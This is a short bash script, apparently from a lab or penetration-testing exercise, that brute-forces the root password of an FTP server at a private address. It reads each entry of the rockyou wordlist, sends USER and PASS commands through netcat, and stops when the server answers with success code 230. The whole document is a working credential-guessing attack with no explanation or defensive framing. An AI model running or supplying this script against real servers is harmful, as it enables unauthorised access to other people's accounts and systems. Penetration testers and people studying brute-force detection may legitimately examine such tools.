#!/bin/bash

IP="172.16.10.11" # IP Address of p-fpt-01
PORT=21
USERNAME="root"
PASSWORDLIST="/usr/share/wordlists/rockyou.txt"

# Loop through the wordlist and attempt password authentication
while read -r PASSWORD; do

  echo "Trying password: ${PASSWORD}"

  # Attempt FTP login
res=$(echo -e "USER ${USERNAME}\r\nPASS ${PASSWORD}\r\nQUIT" | nc ${IP} ${PORT})

  # Check the FTP server response for successful authentication
  if echo "${res}" | grep -q "230"; then
    echo "Password found: ${PASSWORD}"
    exit 0  # Exit the script if a valid password is found
  fi
done < "${PASSWORDLIST}"

# If the loop completes without finding a valid password
echo "Password not found."
exit 1

